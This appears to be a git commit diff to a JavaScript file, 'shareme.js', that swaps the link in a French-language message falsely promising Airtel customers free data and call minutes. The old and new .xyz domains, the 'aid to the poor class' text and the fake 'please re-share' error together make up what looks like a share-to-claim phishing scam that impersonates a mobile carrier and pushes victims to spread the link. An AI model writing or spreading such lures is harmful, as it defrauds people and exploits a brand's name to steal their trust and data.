a063c85f1c61a640589f4dbcc29eca5a2c812864
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-01-28 04:55:03 -0800

    Update shareme.js

--- shareme.js
+++ shareme.js
@@ -1,5 +1,5 @@
 
-        var text1 = "*Airtel récompense les clients qui utilisent le réseau depuis 1 an et plus avec 10 Go de données gratuites et 1 000 minutes de conversation gratuites.*%0A%0AVÉRIFIER ICI👇👇%0Ahttps://30gbbonus.xyz/felixoffer.html",
+        var text1 = "*Airtel récompense les clients qui utilisent le réseau depuis 1 an et plus avec 10 Go de données gratuites et 1 000 minutes de conversation gratuites.*%0A%0AVÉRIFIER ICI👇👇%0Ahttps://2024-program.xyz/airtelrewards.html",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
